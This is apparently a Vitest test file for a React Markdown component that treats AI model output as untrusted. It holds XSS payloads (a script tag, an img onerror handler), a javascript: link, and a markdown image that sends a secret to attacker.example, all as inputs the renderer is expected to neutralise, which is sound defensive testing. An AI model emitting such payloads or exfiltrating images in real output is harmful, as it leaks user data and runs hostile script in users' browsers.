import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { Markdown } from "./Markdown";

afterEach(cleanup);

describe("Markdown (model output is untrusted)", () => {
  it("never runs a <script> from model output", () => {
    (window as unknown as { pwned?: boolean }).pwned = false;
    const { container } = render(<Markdown text={'Hello <script>window.pwned = true</script> <img src=x onerror="window.pwned=true">'} />);
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect((window as unknown as { pwned?: boolean }).pwned).toBe(false);
  });

  it("does not request remote images (exfiltration)", () => {
    const { container } = render(<Markdown text="Answer [1]. ![x](https://attacker.example/?d=SECRET)" />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("attacker.example");
    expect(screen.getByText(/image not shown/)).toBeTruthy();
  });

  it("drops javascript: links", () => {
    const { container } = render(<Markdown text="[click](javascript:alert(1))" />);
    expect(container.querySelector("a")?.getAttribute("href") ?? "").not.toContain("javascript");
  });

  it("turns citation markers into buttons that open the source", () => {
    const onCite = vi.fn();
    render(<Markdown text="A Pod runs containers [1][2]. Out of range [9]." onCite={onCite} maxCitation={2} />);
    fireEvent.click(screen.getByRole("button", { name: "Open source 2" }));
    expect(onCite).toHaveBeenCalledWith(2);
    expect(screen.queryByRole("button", { name: "Open source 9" })).toBeNull();
  });
});
